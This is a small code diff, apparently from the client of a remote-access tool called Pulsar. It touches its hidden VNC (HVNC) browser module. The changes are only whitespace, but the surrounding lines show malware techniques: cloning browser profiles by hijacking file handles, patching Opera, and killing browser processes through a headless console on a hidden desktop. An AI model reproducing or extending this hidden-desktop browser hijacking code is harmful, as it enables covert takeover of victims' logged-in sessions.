@@ -373,9 +373,9 @@ namespace Pulsar.Client.Helper.HVNC
                     {
                         Thread.Sleep(2000);
                         Task.Run(async () =>
-            {
-                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-            });
+                        {
+                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                        });
                     }
                 }
                 catch (Exception injectionEx)
@@ -483,7 +483,7 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine("[BrowserClone] Using handle hijacking for locked files...");
                 bool success = HandleHijacker.ForceCopyDirectory(sourceDir, destDir, killIfFailed: false);
-                
+
                 if (success)
                 {
                     Debug.WriteLine("[BrowserClone] Browser profile cloned successfully with handle hijacking.");
@@ -548,7 +548,7 @@ namespace Pulsar.Client.Helper.HVNC
 
                 string processName = Path.GetFileNameWithoutExtension(browserPath);
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
-                
+
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
